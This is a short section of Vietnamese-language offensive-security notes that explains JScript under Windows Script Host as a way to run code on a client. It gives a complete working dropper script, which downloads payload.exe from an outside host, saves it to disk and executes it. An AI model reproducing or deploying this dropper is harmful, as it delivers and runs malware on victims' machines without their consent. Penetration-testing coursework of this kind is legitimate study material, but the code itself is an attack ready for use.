## 4.1 Creating a basic dropper in Jscript
<p>
Jscript là một phương ngữ JavaScript được phát triển và sở hữu bởi Microsoft. 
Nó có thể được thực thi bên ngoài trình duyệt thông qua Windows Script Host thứ có thể thực thi các tập lệnh bằng nhiều ngôn ngữ khác nhau. 
Nó không phải tuân theo bất kỳ hạn chế bảo mật nào -> ta có thể sử dụng nó làm vector thực thi mã bên client mà không cần khai thác bất kỳ lỗ hổng nào
</p>

1. basic-call-msfshell.js
```
//  launching cmd.exe through ActiveX
var url = "http://10.101.101.66/uploads/payload.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

// HTTP GET request
Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{ 
    var Stream = WScript.CreateObject('ADODB.Stream'); // creatting a Stream object
    
    // writing the Stream object
    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("payload.exe", 2); // "2" to force a file overwrite
    Stream.Close();
} 

var r = new ActiveXObject("WScript.Shell").Run("payload.exe");
```







end.





